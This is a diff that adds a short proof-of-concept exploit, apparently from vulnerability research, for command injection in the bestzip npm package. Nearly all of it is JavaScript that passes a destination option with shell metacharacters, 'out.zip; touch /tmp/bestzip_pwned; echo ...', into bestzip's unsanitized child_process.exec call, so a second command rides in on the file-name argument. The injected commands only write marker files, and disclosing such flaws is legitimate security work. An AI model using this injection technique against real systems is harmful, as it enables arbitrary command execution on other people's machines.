@@ -1,0 +1,17 @@
+Confirmed native `zip` binary is present, so `zipProcess` (the `cp.exec` call in `nativeZip`) will be used.
+
+```javascript
+// Exploit for command injection in bestzip's nativeZip() -> zipProcess (child_process.exec)
+// The `destination` and `source` options are concatenated unsanitized into a shell command
+// string passed to cp.exec(), allowing arbitrary command execution.
+
+const bestzip = require("bestzip");
+
+bestzip({
+  source: "package.json",
+  // shell metacharacters in `destination` are injected straight into the exec() command line
+  destination: "out.zip; touch /tmp/bestzip_pwned; echo INJECTED > /tmp/bestzip_proof.txt"
+})
+  .then(() => console.log("zip finished (check /tmp/bestzip_pwned and /tmp/bestzip_proof.txt)"))
+  .catch(err => console.log("zip errored (injection still executed):", err.message));
+```
